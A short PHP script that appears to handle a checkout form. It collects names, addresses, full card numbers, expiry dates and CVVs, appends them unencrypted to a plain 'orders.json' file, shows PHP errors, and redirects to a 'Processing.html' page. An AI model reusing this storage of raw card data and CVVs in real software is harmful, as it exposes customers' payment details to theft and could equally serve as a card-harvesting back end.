<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $formData = [
        'firstname' => $_POST['firstname'] ?? '',
        'email' => $_POST['email'] ?? '',
        'address' => $_POST['address'] ?? '',
        'city' => $_POST['city'] ?? '',
        'state' => $_POST['state'] ?? '',
        'zip' => $_POST['zip'] ?? '',
        'cardname' => $_POST['cardname'] ?? '',
        'cardnumber' => $_POST['cardnumber'] ?? '',
        'expmonth' => $_POST['expmonth'] ?? '',
        'expyear' => $_POST['expyear'] ?? '',
        'cvv' => $_POST['cvv'] ?? '',
        'shipping_same_as_billing' => isset($_POST['sameadr']) ? true : false,
        'shippingname' => $_POST['shippingname'] ?? '',
        'shippingemail' => $_POST['shippingemail'] ?? '',
        'shippingaddress' => $_POST['shippingaddress'] ?? '',
        'shippingcity' => $_POST['shippingcity'] ?? '',
        'shippingstate' => $_POST['shippingstate'] ?? '',
        'shippingzip' => $_POST['shippingzip'] ?? '',
    ];

    // JSON encode the data
    $json_data = json_encode($formData, JSON_PRETTY_PRINT);

    // Define the file path where you want to save the JSON data
    $file = 'orders.json';

    // Append the data to the JSON file
    if (file_put_contents($file, $json_data . "\n", FILE_APPEND | LOCK_EX) === false) {
        echo "Failed to write to $file";
    } else {
        header('Location: Processing.html');
        exit();
    }
} else {
    echo "Invalid request method.";
}
?>
